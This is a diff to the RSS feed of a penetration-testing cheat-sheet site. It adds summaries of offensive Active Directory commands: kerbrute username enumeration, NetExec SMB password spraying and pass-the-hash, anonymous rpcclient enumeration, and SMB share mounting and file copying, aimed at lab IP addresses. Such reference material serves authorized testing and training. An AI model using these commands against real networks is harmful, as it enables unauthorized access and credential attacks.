@@ -15,11 +15,32 @@
       <description>SMB Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\10.10.14.10\share # Connect to SMB server with creds net use \\10.10.14.10\share /u:user password # From target Windows to local Linux copy test.txt \\10.10.14.10\share # From local Linux to target Windows copy \\10.10.14.10\share\test.txt test.txt # Delete file del test.txt # Remove SMB share net use /d \\10.13.14.10\share # Older Windows (e.</description>
     </item>
     <item>
+      <title>Kerberos</title>
+      <link>https://tldrbins.github.io/kerberos/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/kerberos/</guid>
+      <description>Kerbrute Download kerbrute&#xA;kerbrute userenum --domain example.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.11.10 Generate Kerberos Ticket (From Linux) sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to `/etc/hosts` 10.10.11.10 example.com dc01.example.com dc01 # Step 2: Add domain controller as a DNS server to `/etc/resolv.conf` nameserver 10.10.11.10 # Step 3: Edit `/etc/krb5.conf` [libdefaults] default_realm = EXAMPLE.COM [realms] example.com = { kdc = dc01.example.com:88 admin_serve = dc01.example.com default_domain = example.com } [domain_realm] .</description>
+    </item>
+    <item>
       <title>Mount Share</title>
       <link>https://tldrbins.github.io/share_mount/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/share_mount/</guid>
-      <description> NFS List share showmount -e 10.10.11.10 Mount share sudo mount -t nfs 10.10.11.10:/share /mnt/share/ Others # Check how shares are mounted cat /etc/exports # root_squash : running as root on local system will be treated as the default nobody user in target # no_all_squash: every other users permission will translate from local system to target SMB Mount share sudo mount -t cifs &amp;#34;//10.10.11.10/Remote Shares&amp;#34; /mnt </description>
+      <description>NFS List share showmount -e 10.10.11.10 Mount share sudo mount -t nfs 10.10.11.10:/share /mnt/share/ Others # Check all mounted drives mount # Check how shares are mounted cat /etc/exports # root_squash : running as root on local system will be treated as the default nobody user in target # no_all_squash: every other users permission will translate from local system to target SMB Mount share sudo mount -t cifs //10.10.11.10/share /mnt # With creds sudo mount -t cifs -o user=username,pass=password //10.</description>
+    </item>
+    <item>
+      <title>NetExec (nxc)</title>
+      <link>https://tldrbins.github.io/nxc/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/nxc/</guid>
+      <description> nxc Download nxc&#xA;SMB # Single user and password nxc smb 10.10.11.10 -u username -p password # Single user and password (Active Directory) nxc smb -u username -p password -d domain -dc-ip 10.10.11.10 # Multiple users or passwords nxc smb -u usernames.txt -p password -d domain -dc-ip 10.10.11.10 --continue-on-success # With LM Hash:NT Hash nxc smb 10.10.11.10 -u username -H LM_hash:NT_hash </description>
+    </item>
+    <item>
+      <title>RPC</title>
+      <link>https://tldrbins.github.io/rpc/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/rpc/</guid>
+      <description> RPC rpcclient # Connect without creds rpcclient -U &amp;#39;&amp;#39; -N 10.10.11.10 # Connect with creds rpcclient -U domain/username 10.10.11.10 # Commands querydispinfo enumdomusers </description>
     </item>
     <item>
       <title>SMB Enum</title>
